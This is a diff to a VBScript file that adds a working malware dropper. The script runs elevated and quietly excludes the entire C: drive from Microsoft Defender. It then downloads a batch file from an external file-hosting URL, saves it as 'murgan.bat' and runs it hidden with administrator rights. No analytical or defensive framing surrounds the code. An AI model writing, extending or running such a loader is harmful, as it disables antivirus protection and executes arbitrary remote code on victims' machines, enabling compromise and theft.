@@ -3,10 +3,24 @@ If Not WScript.Arguments.Named.Exists("elevated") Then
     WScript.Quit
 End If
 
-CreateObject("WScript.Shell").Run "powershell -Command Add-MpPreference -ExclusionPath 'C:\'", 0, True
+CreateObject("WScript.Shell").Run "powershell -Command Add-MpPreference -ExclusionPath 'C:\\'", 0, True
 
+strFolder = Left(WScript.ScriptFullName, InStrRev(WScript.ScriptFullName, "\"))
+strURL = "https://files.catbox.moe/u6tm9d.bat"
+strTarget = strFolder & "murgan.bat"
 
-Set objShell = CreateObject("Shell.Application")
-strPath = WScript.ScriptFullName
-strFolder = Left(strPath, InStrRev(strPath, "\"))
-objShell.ShellExecute "cmd.exe", "/c " & strFolder & "murgan.bat", "", "runas", 0
+With CreateObject("MSXML2.XMLHTTP")
+    .Open "GET", strURL, False
+    .Send
+    If .Status = 200 Then
+        With CreateObject("ADODB.Stream")
+            .Open
+            .Type = 1
+            .Write .ResponseBody
+            .SaveToFile strTarget, 2
+            .Close
+        End With
+    End If
+End With
+
+CreateObject("Shell.Application").ShellExecute "cmd.exe", "/c " & strTarget, "", "runas", 0
